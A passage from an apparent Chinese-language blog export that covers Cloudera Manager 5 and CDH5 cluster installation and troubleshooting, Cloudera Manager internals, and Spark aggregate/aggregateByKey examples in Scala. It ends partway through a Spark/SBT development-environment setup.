<p>cloudera manager的目录默认位置在&#x2F;opt下，解压：<code>tar xzvf cloudera-manager*.tar.gz</code>将解压后的cm-5.1.3和cloudera目录放到&#x2F;opt目录下。</p>
<p><strong>为Cloudera Manager 5建立数据库</strong></p>
<p>首先需要去MySql的官网下载JDBC驱动，<a href="http://dev.mysql.com/downloads/connector/j/%E3%80%82">http://dev.mysql.com/downloads/connector/j/。</a></p>
<p>解压后，找到mysql-connector-java-5.1.33-bin.jar，放到<code>/opt/cm-5.1.3/share/cmf/lib/</code>中。</p>
<p>在主节点初始化CM5的数据库：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/opt/cm-5.1.3/share/cmf/schema/scm_prepare_database.sh mysql cm -hlocalhost -uroot -pxxxx --scm-host localhost scm scm scm</span><br></pre></td></tr></table></figure>

<p><strong>Agent配置</strong></p>
<p>修改<code>/opt/cm-5.1.3/etc/cloudera-scm-agent/config.ini</code>中的server_host为主节点的主机名。</p>
<p><strong>同步Agent到其他节点</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp -r /opt/cm-5.1.3 root@n2:/opt/</span><br></pre></td></tr></table></figure>

<p><strong>在所有节点创建cloudera-scm用户</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">useradd --system --home=/opt/cm-5.1.3/run/cloudera-scm-server/ --no-create-home --shell=/bin/false --comment &quot;Cloudera SCM User&quot; cloudera-scm</span><br></pre></td></tr></table></figure>

<p><strong>准备Parcels，用以安装CDH5</strong></p>
<p>将CHD5相关的Parcel包放到主节点的<code>/opt/cloudera/parcel-repo/</code>目录中（parcel-repo需要手动创建）。</p>
<p>相关的文件如下：</p>
<ul>
<li>CDH-5.1.3-1.cdh5.1.3.p0.12-el6.parcel</li>
<li>CDH-5.1.3-1.cdh5.1.3.p0.12-el6.parcel.sha1</li>
<li>manifest.json</li>
</ul>
<p>最后将CDH-5.1.3-1.cdh5.1.3.p0.12-el6.parcel.sha1，重命名为CDH-5.1.3-1.cdh5.1.3.p0.12-el6.parcel.sha，这点必须注意，否则，系统会重新下载CDH-5.1.3-1.cdh5.1.3.p0.12-el6.parcel文件。</p>
<p><strong>相关启动脚本</strong></p>
<p>通过<code>/opt/cm-5.1.3/etc/init.d/cloudera-scm-server start</code>启动服务端。</p>
<p>通过<code>/opt/cm-5.1.3/etc/init.d/cloudera-scm-agent start</code>启动Agent服务。</p>
<p>我们启动的其实是个service脚本，需要停止服务将以上的start参数改为stop就可以了，重启是restart。</p>
<h2 id="CDH5的安装配置"><a href="#CDH5的安装配置" class="headerlink" title="CDH5的安装配置"></a>CDH5的安装配置</h2><p>Cloudera Manager Server和Agent都启动以后，就可以进行CDH5的安装配置了。</p>
<p>这时可以通过浏览器访问主节点的7180端口测试一下了（由于CM Server的启动需要花点时间，这里可能要等待一会才能访问），默认的用户名和密码均为admin。</p>
<p><img src="/images/hadoop/cdhinstall/1.png"></p>
<p>免费版本的CM5已经没有原来50个节点数量的限制了。</p>
<p><img src="/images/hadoop/cdhinstall/2.png"></p>
<p>各个Agent节点正常启动后，可以在当前管理的主机列表中看到对应的节点。选择要安装的节点，点继续。</p>
<p><img src="/images/hadoop/cdhinstall/3.png"></p>
<p>接下来，出现以下包名，说明本地Parcel包配置无误，直接点继续就可以了。</p>
<p><img src="/images/hadoop/cdhinstall/4.png"></p>
<p>点击，继续，如果配置本地Parcel包无误，那么下图中的已下载，应该是瞬间就完成了，然后就是耐心等待分配过程就行了，大约10多分钟吧，取决于内网网速。</p>
<p><img src="/images/hadoop/cdhinstall/5.png"></p>
<p>接下来是服务器检查，可能会遇到以下问题：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cloudera 建议将 /proc/sys/vm/swappiness 设置为 0。当前设置为 60。使用 sysctl 命令在运行时更改该设置并编辑 /etc/sysctl.conf 以在重启后保存该设置。您可以继续进行安装，但可能会遇到问题，Cloudera Manager 报告您的主机由于交换运行状况不佳。以下主机受到影响：</span><br></pre></td></tr></table></figure>
<p>通过<code>echo 0 &gt; /proc/sys/vm/swappiness</code>即可解决。</p>
<p><img src="/images/hadoop/cdhinstall/6.png"></p>
<p>接下来是选择安装服务：</p>
<p><img src="/images/hadoop/cdhinstall/7.png"></p>
<p>服务配置，一般情况下保持默认就可以了（Cloudera Manager会根据机器的配置自动进行配置，如果需要特殊调整，自行进行设置就可以了）：</p>
<p><img src="/images/hadoop/cdhinstall/8.png"></p>
<p>接下来是数据库的设置，检查通过后就可以进行下一步的操作了：</p>
<p><img src="/images/hadoop/cdhinstall/9.png"></p>
<p>下面是集群设置的审查页面，我这里都是保持默认配置的：</p>
<p><img src="/images/hadoop/cdhinstall/10.png"></p>
<p>终于到安装各个服务的地方了，注意，这里安装Hive的时候可能会报错，因为我们使用了MySql作为hive的元数据存储，hive默认没有带mysql的驱动，通过以下命令拷贝一个就行了：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp /opt/cm-5.1.3/share/cmf/lib/mysql-connector-java-5.1.33-bin.jar /opt/cloudera/parcels/CDH-5.1.3-1.cdh5.1.3.p0.12/lib/hive/lib/</span><br></pre></td></tr></table></figure>
<p><img src="/images/hadoop/cdhinstall/11.png"></p>
<p>服务的安装过程大约半小时内就可以完成：</p>
<p><img src="/images/hadoop/cdhinstall/12.png"></p>
<p>安装完成后，就可以进入集群界面看一下集群的当前状况了。</p>
<p>这里可能会出现无法发出查询：对 Service Monitor 的请求超时的错误提示，如果各个组件安装没有问题，一般是因为服务器比较卡导致的，过一会刷新一下页面就好了：</p>
<p><img src="/images/hadoop/cdhinstall/13.png"></p>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>在集群的一台机器上执行以下模拟Pi的示例程序：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -u hdfs hadoop jar /opt/cloudera/parcels/CDH/lib/hadoop-mapreduce/hadoop-mapreduce-examples.jar pi 10 100</span><br></pre></td></tr></table></figure>

<p>执行过程需要花一定的时间，通过YARN的后台也可以看到MapReduce的执行状态：</p>
<p><img src="/images/hadoop/cdhinstall/14.png"></p>
<p>MapReduce执行过程中终端的输出如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Number of Maps  = 10</span><br><span class="line">Samples per Map = 100</span><br><span class="line">Wrote input for Map #0</span><br><span class="line">Wrote input for Map #1</span><br><span class="line">Wrote input for Map #2</span><br><span class="line">Wrote input for Map #3</span><br><span class="line">Wrote input for Map #4</span><br><span class="line">Wrote input for Map #5</span><br><span class="line">Wrote input for Map #6</span><br><span class="line">Wrote input for Map #7</span><br><span class="line">Wrote input for Map #8</span><br><span class="line">Wrote input for Map #9</span><br><span class="line">Starting Job</span><br><span class="line">14/10/13 01:15:34 INFO client.RMProxy: Connecting to ResourceManager at n1/192.168.1.161:8032</span><br><span class="line">14/10/13 01:15:36 INFO input.FileInputFormat: Total input paths to process : 10</span><br><span class="line">14/10/13 01:15:37 INFO mapreduce.JobSubmitter: number of splits:10</span><br><span class="line">14/10/13 01:15:39 INFO mapreduce.JobSubmitter: Submitting tokens for job: job_1413132307582_0001</span><br><span class="line">14/10/13 01:15:40 INFO impl.YarnClientImpl: Submitted application application_1413132307582_0001</span><br><span class="line">14/10/13 01:15:40 INFO mapreduce.Job: The url to track the job: http://n1:8088/proxy/application_1413132307582_0001/</span><br><span class="line">14/10/13 01:15:40 INFO mapreduce.Job: Running job: job_1413132307582_0001</span><br><span class="line">14/10/13 01:17:13 INFO mapreduce.Job: Job job_1413132307582_0001 running in uber mode : false</span><br><span class="line">14/10/13 01:17:13 INFO mapreduce.Job:  map 0% reduce 0%</span><br><span class="line">14/10/13 01:18:02 INFO mapreduce.Job:  map 10% reduce 0%</span><br><span class="line">14/10/13 01:18:25 INFO mapreduce.Job:  map 20% reduce 0%</span><br><span class="line">14/10/13 01:18:35 INFO mapreduce.Job:  map 30% reduce 0%</span><br><span class="line">14/10/13 01:18:45 INFO mapreduce.Job:  map 40% reduce 0%</span><br><span class="line">14/10/13 01:18:53 INFO mapreduce.Job:  map 50% reduce 0%</span><br><span class="line">14/10/13 01:19:01 INFO mapreduce.Job:  map 60% reduce 0%</span><br><span class="line">14/10/13 01:19:09 INFO mapreduce.Job:  map 70% reduce 0%</span><br><span class="line">14/10/13 01:19:17 INFO mapreduce.Job:  map 80% reduce 0%</span><br><span class="line">14/10/13 01:19:25 INFO mapreduce.Job:  map 90% reduce 0%</span><br><span class="line">14/10/13 01:19:33 INFO mapreduce.Job:  map 100% reduce 0%</span><br><span class="line">14/10/13 01:19:51 INFO mapreduce.Job:  map 100% reduce 100%</span><br><span class="line">14/10/13 01:19:53 INFO mapreduce.Job: Job job_1413132307582_0001 completed successfully</span><br><span class="line">14/10/13 01:19:56 INFO mapreduce.Job: Counters: 49</span><br><span class="line">    File System Counters</span><br><span class="line">        FILE: Number of bytes read=91</span><br><span class="line">        FILE: Number of bytes written=1027765</span><br><span class="line">        FILE: Number of read operations=0</span><br><span class="line">        FILE: Number of large read operations=0</span><br><span class="line">        FILE: Number of write operations=0</span><br><span class="line">        HDFS: Number of bytes read=2560</span><br><span class="line">        HDFS: Number of bytes written=215</span><br><span class="line">        HDFS: Number of read operations=43</span><br><span class="line">        HDFS: Number of large read operations=0</span><br><span class="line">        HDFS: Number of write operations=3</span><br><span class="line">    Job Counters</span><br><span class="line">        Launched map tasks=10</span><br><span class="line">        Launched reduce tasks=1</span><br><span class="line">        Data-local map tasks=10</span><br><span class="line">        Total time spent by all maps in occupied slots (ms)=118215</span><br><span class="line">        Total time spent by all reduces in occupied slots (ms)=11894</span><br><span class="line">        Total time spent by all map tasks (ms)=118215</span><br><span class="line">        Total time spent by all reduce tasks (ms)=11894</span><br><span class="line">        Total vcore-seconds taken by all map tasks=118215</span><br><span class="line">        Total vcore-seconds taken by all reduce tasks=11894</span><br><span class="line">        Total megabyte-seconds taken by all map tasks=121052160</span><br><span class="line">        Total megabyte-seconds taken by all reduce tasks=12179456</span><br><span class="line">    Map-Reduce Framework</span><br><span class="line">        Map input records=10</span><br><span class="line">        Map output records=20</span><br><span class="line">        Map output bytes=180</span><br><span class="line">        Map output materialized bytes=340</span><br><span class="line">        Input split bytes=1380</span><br><span class="line">        Combine input records=0</span><br><span class="line">        Combine output records=0</span><br><span class="line">        Reduce input groups=2</span><br><span class="line">        Reduce shuffle bytes=340</span><br><span class="line">        Reduce input records=20</span><br><span class="line">        Reduce output records=0</span><br><span class="line">        Spilled Records=40</span><br><span class="line">        Shuffled Maps =10</span><br><span class="line">        Failed Shuffles=0</span><br><span class="line">        Merged Map outputs=10</span><br><span class="line">        GC time elapsed (ms)=1269</span><br><span class="line">        CPU time spent (ms)=9530</span><br><span class="line">        Physical memory (bytes) snapshot=3792773120</span><br><span class="line">        Virtual memory (bytes) snapshot=16157274112</span><br><span class="line">        Total committed heap usage (bytes)=2856624128</span><br><span class="line">    Shuffle Errors</span><br><span class="line">        BAD_ID=0</span><br><span class="line">        CONNECTION=0</span><br><span class="line">        IO_ERROR=0</span><br><span class="line">        WRONG_LENGTH=0</span><br><span class="line">        WRONG_MAP=0</span><br><span class="line">        WRONG_REDUCE=0</span><br><span class="line">    File Input Format Counters</span><br><span class="line">        Bytes Read=1180</span><br><span class="line">    File Output Format Counters</span><br><span class="line">        Bytes Written=97</span><br><span class="line">Job Finished in 262.659 seconds</span><br><span class="line">Estimated value of Pi is 3.14800000000000000000</span><br></pre></td></tr></table></figure>

<p>检查Hue</p>
<p>首次登陆Hue会让设置一个初试的用户名和密码，设置好，登陆到后台，会做一次检查，一切正常后会提示：</p>
<p><img src="/images/hadoop/cdhinstall/15.png"></p>
<p>到这里表明我们的集群可以使用了。</p>
<h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h2><p>Agent启动后，安装阶段“当前管理的主机”中显示的节点不全，每次刷新显示的都不一样。</p>
<p>Agent的错误日志表现如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[18/Nov/2014 21:12:56 +0000] 22681 MainThread agent ERROR Heartbeating to master:7182 failed.</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;/home/opt/cm-5.2.0/lib64/cmf/agent/src/cmf/agent.py&quot;, line 820, in send_heartbeat</span><br><span class="line">    response = self.requestor.request(&#x27;heartbeat&#x27;, dict(request=heartbeat))</span><br><span class="line">  File &quot;/home/opt/cm-5.2.0/lib64/cmf/agent/build/env/lib/python2.6/site-packages/avro-1.6.3-py2.6.egg/avro/ipc.py&quot;, line 139, in request</span><br><span class="line">    return self.issue_request(call_request, message_name, request_datum)</span><br><span class="line">  File &quot;/home/opt/cm-5.2.0/lib64/cmf/agent/build/env/lib/python2.6/site-packages/avro-1.6.3-py2.6.egg/avro/ipc.py&quot;, line 255, in issue_request</span><br><span class="line">    return self.read_call_response(message_name, buffer_decoder)</span><br><span class="line">  File &quot;/home/opt/cm-5.2.0/lib64/cmf/agent/build/env/lib/python2.6/site-packages/avro-1.6.3-py2.6.egg/avro/ipc.py&quot;, line 235, in read_call_response</span><br><span class="line">    raise self.read_error(writers_schema, readers_schema, decoder)</span><br><span class="line">  File &quot;/home/opt/cm-5.2.0/lib64/cmf/agent/build/env/lib/python2.6/site-packages/avro-1.6.3-py2.6.egg/avro/ipc.py&quot;, line 244, in read_error</span><br><span class="line">    return AvroRemoteException(datum_reader.read(decoder))</span><br><span class="line">  File &quot;/home/opt/cm-5.2.0/lib64/cmf/agent/build/env/lib/python2.6/site-packages/avro-1.6.3-py2.6.egg/avro/io.py&quot;, line 444, in read</span><br><span class="line">    return self.read_data(self.writers_schema, self.readers_schema, decoder)</span><br><span class="line">  File &quot;/home/opt/cm-5.2.0/lib64/cmf/agent/build/env/lib/python2.6/site-packages/avro-1.6.3-py2.6.egg/avro/io.py&quot;, line 448, in read_data</span><br><span class="line">    if not DatumReader.match_schemas(writers_schema, readers_schema):</span><br><span class="line">  File &quot;/home/opt/cm-5.2.0/lib64/cmf/agent/build/env/lib/python2.6/site-packages/avro-1.6.3-py2.6.egg/avro/io.py&quot;, line 379, in match_schemas</span><br><span class="line">    w_type = writers_schema.type</span><br><span class="line">AttributeError: &#x27;NoneType&#x27; object has no attribute &#x27;type&#x27;</span><br></pre></td></tr></table></figure>

<p>这是由于在主节点上启动了Agent后，又将Agent scp到了其他节点上导致的，首次启动Agent，它会生成一个uuid，路径为：<code>/opt/cm-5.1.3/lib/cloudera-scm-agent/uuid</code>,这样的话每台机器上的Agent的uuid都是一样的了，就会出现紊乱的情况。</p>
<p><strong>解决方案：</strong></p>
<p>删除<code>/opt/cm-5.1.3/lib/cloudera-scm-agent/</code>目录下的所有文件。</p>
<p>清空主节点CM数据库。</p>
<p><strong>最佳实践</strong></p>
<p>在内网单独搭建yum的repo，然后CM的管理界面安装Agent，这样安装比较快，也不会出现什么问题。</p>
<p>如果手动添加添加Agent的话，需要注意启动之前删除相关的标示文件，否则Server端在数据库中记录Agent的信息，还得清理数据库中的信息，就麻烦了。</p>
<p>转自：<a href="http://www.cnblogs.com/jasondan/p/4011153.html">http://www.cnblogs.com/jasondan/p/4011153.html</a></p>
]]></content>
      <categories>
        <category>大数据</category>
      </categories>
      <tags>
        <tag>大数据</tag>
      </tags>
  </entry>
  <entry>
    <title>解析Cloudera Manager内部结构</title>
    <url>/blog/bigdata/hadoop/cdh/cmarch/</url>
    <content><![CDATA[<ol>
<li>CM的安装目录在什么位置？</li>
<li>hadoop配置文件在什么位置？</li>
<li>Cloudera manager运行所需要的信息存在什么位置？</li>
<li>CM结构和功能是什么？</li>
</ol>
<h2 id="1-相关目录"><a href="#1-相关目录" class="headerlink" title="1. 相关目录"></a>1. 相关目录</h2><ul>
<li>&#x2F;var&#x2F;log&#x2F;cloudera-scm-installer : 安装日志目录。</li>
<li>&#x2F;var&#x2F;log&#x2F;* : 相关日志文件（相关服务的及CM的）。</li>
<li>&#x2F;usr&#x2F;share&#x2F;cmf&#x2F; : 程序安装目录。</li>
<li>&#x2F;usr&#x2F;lib64&#x2F;cmf&#x2F; : Agent程序代码。</li>
<li>&#x2F;var&#x2F;lib&#x2F;cloudera-scm-server-db&#x2F;data : 内嵌数据库目录。</li>
<li>&#x2F;usr&#x2F;bin&#x2F;postgres : 内嵌数据库程序。</li>
<li>&#x2F;etc&#x2F;cloudera-scm-agent&#x2F; : agent的配置目录。</li>
<li>&#x2F;etc&#x2F;cloudera-scm-server&#x2F; : server的配置目录。</li>
<li>&#x2F;opt&#x2F;cloudera&#x2F;parcels&#x2F; : Hadoop相关服务安装目录。</li>
<li>&#x2F;opt&#x2F;cloudera&#x2F;parcel-repo&#x2F; : 下载的服务软件包数据，数据格式为parcels。</li>
<li>&#x2F;opt&#x2F;cloudera&#x2F;parcel-cache&#x2F; : 下载的服务软件包缓存数据。</li>
<li>&#x2F;etc&#x2F;hadoop&#x2F;* : 客户端配置文件目录。</li>
</ul>
<h2 id="2-配置"><a href="#2-配置" class="headerlink" title="2. 配置"></a>2. 配置</h2><p><strong>Hadoop配置文件</strong></p>
<p>配置文件放置于&#x2F;var&#x2F;run&#x2F;cloudera-scm-agent&#x2F;process&#x2F;目录下。如：&#x2F;var&#x2F;run&#x2F;cloudera-scm-agent&#x2F;process&#x2F;193-hdfs-NAMENODE&#x2F;core-site.xml。这些配置文件是通过Cloudera Manager启动相应服务（如HDFS）时生成的，内容从数据库中获得（即通过界面配置的参数）。</p>
<p>在CM界面上更改配置是不会立即反映到配置文件中，这些信息会存储于数据库中，等下次重启服务时才会生成配置文件。且每次启动时都会产生新的配置文件。</p>
<p>CM Server主要数据库为scm基中放置配置的数据表为configs。里面包含了服务的配置信息，每一次配置的更改会把当前页面的所有配置内容添加到数据库中，以此保存配置修改历史。</p>
<p>scm数据库被配置成只能从localhost访问，如果需要从外部连接此数据库，修改<code>vim /var/lib/cloudera-scm-server-db/data/pg_hba.conf</code>文件,之后重启数据库。运行数据库的用户为cloudera-scm。</p>
<p><strong>查看配置内容</strong></p>
<p>直接查询scm数据库的configs数据表的内容。<br>访问REST API： <a href="http://hostname:7180/api/v4/cm/deployment%EF%BC%8C%E8%BF%94%E5%9B%9EJSON%E6%A0%BC%E5%BC%8F%E9%83%A8%E7%BD%B2%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E3%80%82">http://hostname:7180/api/v4/cm/deployment，返回JSON格式部署配置信息。</a></p>
<p><strong>配置生成方式</strong></p>
<p>CM为每个服务进程生成独立的配置目录（文件）。所有配置统一在服务端查询数据库生成（因为scm数据库只能在localhost下访问）生成配置文件，再由agent通过网络下载包含配置文件的zip包到本地解压到指定的目录。</p>
<p><strong>配置修改</strong></p>
<p>CM对于需要修改的配置预先定义，对于没有预先定义的配置,则通过在高级配置项中使用xml配置片段的方式进行配置。而对于&#x2F;etc&#x2F;hadoop&#x2F;下的配置文件是客户端的配置，可以在CM通过部署客户端生成客户端配置。</p>
<h2 id="3-数据库"><a href="#3-数据库" class="headerlink" title="3. 数据库"></a>3. 数据库</h2><p>Cloudera manager主要的数据库为scm,存储Cloudera manager运行所需要的信息：配置，主机，用户等。</p>
<h2 id="4-CM结构"><a href="#4-CM结构" class="headerlink" title="4. CM结构"></a>4. CM结构</h2><p>CM分为Server与Agent两部分及数据库（自带更改过的嵌入Postgresql）。它主要做三件事件：</p>
<ul>
<li>管理监控集群主机。</li>
<li>统一管理配置。</li>
<li>管理维护Hadoop平台系统。</li>
</ul>
<p>实现采用C&#x2F;S结构，Agent为客户端负责执行服务端发来的命令，执行方式一般为使用python调用相应的服务shell脚本。Server端为Java REST服务，提供REST API，Web管理端通过REST API调用Server端功能，Web界面使用富客户端技术（Knockout）。</p>
<ul>
<li>Server端主体使用Java实现。</li>
<li>Agent端主体使用Python, 服务的启动通过调用相应的shell脚本进行启动，如果启动失败会重复4次调用启动脚本。</li>
<li>Agent与Server保持心跳，使用Thrift RPC框架。</li>
</ul>
<h2 id="5-升级"><a href="#5-升级" class="headerlink" title="5. 升级"></a>5. 升级</h2><p>在CM中可以通过界面向导升级相关服务。升级过程为三步：</p>
<ul>
<li>下载服务软件包。</li>
<li>把所下载的服务软件包分发到集群中受管的机器上。</li>
<li>安装服务软件包，使用软链接的方式把服务程序目录链接到新安装的软件包目录上。</li>
</ul>
<h2 id="6-卸载"><a href="#6-卸载" class="headerlink" title="6. 卸载"></a>6. 卸载</h2><p><code>sudo /usr/share/cmf/uninstall-scm-express.sh</code>, 然后删除&#x2F;var&#x2F;lib&#x2F;cloudera-scm-server-db&#x2F;目录，不然下次安装可能不成功。</p>
<h2 id="7-开启postgresql远程访问"><a href="#7-开启postgresql远程访问" class="headerlink" title="7. 开启postgresql远程访问"></a>7. 开启postgresql远程访问</h2><p>CM内嵌数据库被配置成只能从localhost访问，如果需要从外部查看数据，数据修改<code>vim /var/lib/cloudera-scm-server-db/data/pg_hba.conf</code>文件,之后重启数据库。运行数据库的用户为cloudera-scm。</p>
]]></content>
      <categories>
        <category>大数据</category>
      </categories>
      <tags>
        <tag>大数据</tag>
      </tags>
  </entry>
  <entry>
    <title>Spark操作：Aggregate和AggregateByKey</title>
    <url>/blog/bigdata/spark/sparkdiary/aggregate/</url>
    <content><![CDATA[<h2 id="Aggregate"><a href="#Aggregate" class="headerlink" title="Aggregate"></a>Aggregate</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.apache.spark.&#123;SparkConf, SparkContext&#125;</span><br><span class="line"></span><br><span class="line">object AggregateTest &#123;</span><br><span class="line"></span><br><span class="line">  def main(args:Array[String]) = &#123;</span><br><span class="line"></span><br><span class="line">    // 设置运行环境</span><br><span class="line">    val conf = new SparkConf().setAppName(&quot;Aggregate Test&quot;)</span><br><span class="line">    val sc = new SparkContext(conf)</span><br><span class="line"></span><br><span class="line">    var data = List(2,5,8,1,2,6,9,4,3,5)</span><br><span class="line">    var res = data.par.aggregate((0,0))(</span><br><span class="line">      // seqOp</span><br><span class="line">      (acc, number) =&gt; (acc._1+number, acc._2+1),</span><br><span class="line">      // combOp</span><br><span class="line">      (par1, par2) =&gt; (par1._1+par2._1, par1._2+par2._2)</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    println(res)</span><br><span class="line"></span><br><span class="line">    sc.stop</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>acc即(0,0)，number即data，seqOp将data的值累加到Tuple的第一个元素，将data的个数累加到Tuple的第二个元素。由于没有分区，所以combOp是不起作用的，这个例子里面即使分区了，combOp起作用了，结果也是一样的。</p>
<p>运行结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(45,10)</span><br></pre></td></tr></table></figure>

<h2 id="AggregateByKey"><a href="#AggregateByKey" class="headerlink" title="AggregateByKey"></a>AggregateByKey</h2><p>AggregateByKey和Aggregate差不多，也是聚合，不过它是根据Key的值来聚合。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.apache.spark.rdd.RDD</span><br><span class="line">import org.apache.spark.&#123;SparkConf, SparkContext&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line">  * Created by Administrator on 2017/6/13.</span><br><span class="line">  */</span><br><span class="line">object AggregateByKeyTest &#123;</span><br><span class="line"></span><br><span class="line">  def main(args:Array[String]) = &#123;</span><br><span class="line"></span><br><span class="line">    // 设置运行环境</span><br><span class="line">    val conf = new SparkConf().setAppName(&quot;AggregateByKey Test&quot;)</span><br><span class="line">    val sc = new SparkContext(conf)</span><br><span class="line"></span><br><span class="line">    val data = List((1,3),(1,2),(1,4),(2,3),(3,6),(3,8))</span><br><span class="line">    val rdd = sc.parallelize(data)</span><br><span class="line"></span><br><span class="line">    val res : RDD[(Int,Int)] = rdd.aggregateByKey(0)(</span><br><span class="line">      // seqOp</span><br><span class="line">      math.max(_,_),</span><br><span class="line">      // combOp</span><br><span class="line">      _+_</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    res.collect.foreach(println)</span><br><span class="line">    sc.stop</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据Key值的不同，可以分为3个组：</p>
<p>(1)  (1,3),(1,2),(1,4)；<br>(2)  (2,3)；<br>(3)  (3,6),(3,8)。</p>
<p>这3个组分别进行seqOp，也就是(K,V)里面的V和0进行math.max()运算，运算结果和下一个V继续运算，以第一个组为例，运算过程是这样的：</p>
<p>0, 3 &#x3D;&gt; 3<br>3, 2 &#x3D;&gt; 3<br>3, 4 &#x3D;&gt; 4</p>
<p>所以最终结果是(1,4)。combOp是对把各分区的V加起来，由于这里并没有分区，所以实际上是不起作用的。</p>
<p>运行结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(2,3)</span><br><span class="line">(1,4)</span><br><span class="line">(3,8)</span><br></pre></td></tr></table></figure>

<p>如果生成RDD时分成3个区：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">val rdd = sc.parallelize(data,3)</span><br></pre></td></tr></table></figure>

<p>运行结果就变成了：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(3,8)</span><br><span class="line">(1,7)</span><br><span class="line">(2,3)</span><br></pre></td></tr></table></figure>

<p>这是因为一个分区返回(1,3)，另一个分区返回(1,4)，combOp将这两个V加起来，就得到了(1,7)。</p>
]]></content>
      <categories>
        <category>大数据</category>
        <category>spark</category>
      </categories>
      <tags>
        <tag>大数据</tag>
        <tag>spark</tag>
      </tags>
  </entry>
  <entry>
    <title>搭建spark开发环境</title>
    <url>/blog/bigdata/spark/sparkdiary/devenv/</url>
    <content><![CDATA[<p>##下载包</p>
<p>IDE：<a href="http://scala-ide.org/">http://scala-ide.org/</a></p>
<p>SBT：<a href="http://www.scala-sbt.org/">http://www.scala-sbt.org/</a></p>
<p>Windows环境需要下载hadoop common包，并添加bin目录到PATH环境变量上:</p>
<p><a href="https://github.com/srccodes/hadoop-common-2.2.0-bin">https://github.com/srccodes/hadoop-common-2.2.0-bin</a></p>
<p>##SBT安装</p>
<ol>
<li>   下载压缩包，解压到指定位置SBT_HOME。</li>
<li>   将<code>SBT_HOME\bin</code>目录添加到环境变量中，在命令行可以执行sbt命令。</li>
<li>   配制SBT</li>
</ol>
<p>##SBT配制</p>
<p>修改<code>SBT_HOME\conf\sbtconfig.txt</code>，添加</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-Dsbt.ivy.home=&lt;库文件下载到本地的位置&gt;</span><br></pre></td></tr></table></figure>
<p>创建库配制</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">~/.sbt/repositories</span><br></pre></td></tr></table></figure>
<p>文件内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[repositories]</span><br><span class="line">  local</span><br><span class="line">  local_m2: file:/home/darwin/.m2/repository/</span><br><span class="line">  aliyun: http://maven.aliyun.com/nexus/content/groups/public/</span><br><span class="line">  cloudera: https://repository.cloudera.com/artifactory/cloudera-repos/</span><br><span class="line">  maven-central: http://central.maven.org/maven2/</span><br></pre></td></tr></table></figure>
<p>创建插件配制</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">~/.sbt/0.13/plugins/plugins.sbt</span><br></pre></td></tr></table></figure>
<p>文件内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">addSbtPlugin(&quot;com.typesafe.sbteclipse&quot; % &quot;sbteclipse-plugin&quot; % &quot;2.5.0&quot;)</span><br><span class="line"></span><br><span class="line">addSbtPlugin(&quot;com.eed3si9n&quot; % &quot;sbt-assembly&quot; % &quot;0.14.0&quot;)</span><br><span class="line"></span><br><span class="line">addSbtPlugin(&quot;net.virtual-void&quot; % &quot;sbt-dependency-graph&quot; % &quot;0.7.5&quot;)</span><br><span class="line"></span><br><span class="line">addSbtPlugin(&quot;no.arktekk.sbt&quot; % &quot;aether-deploy&quot; % &quot;0.16&quot;)</span><br><span class="line"></span><br><span class="line">addSbtPlugin(&quot;com.eed3si9n&quot; % &quot;sbt-dirty-money&quot; % &quot;0.1.0&quot;)</span><br></pre></td></tr></table></figure>
<p>创建全配制文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">~/.sbt/0.13/global.sbt</span><br></pre></td></tr></table></figure>
<p>文件内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net.virtualvoid.sbt.graph.Plugin.graphSettings</span><br></pre></td></tr></table></figure>
<p>##创建spark项目</p>
<p>按如下结构创建目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">|-- build.sbt         主构建文件 </span><br><span class="line">|—lib                   第三方jar包 </span><br><span class="line">|—project            下有另一个可编程的Build.Scala构建文件可实现高级复杂功能 </span><br><span class="line">|-- src</span><br><span class="line">| |-- main</span><br><span class="line">| | |-- Java</span><br><span class="line">| | |-- resources</span><br><span class="line">| | |-- scala</span><br><span class="line">| |-- test</span><br><span class="line">| |-- java</span><br><span class="line">| |-- resources</span><br><span class="line">| |-- scala</span><br><span class="line">|—target           可选</span><br></pre></td></tr></table></figure>
<p>惯例：<code>build.sbt</code>定义主要简单的配置，对于构建逻辑放到project下的.scala文件中，用于更复杂定义和共享代码</p>
<p>在<code>build.sbt</code>中添加spark包依赖</p>
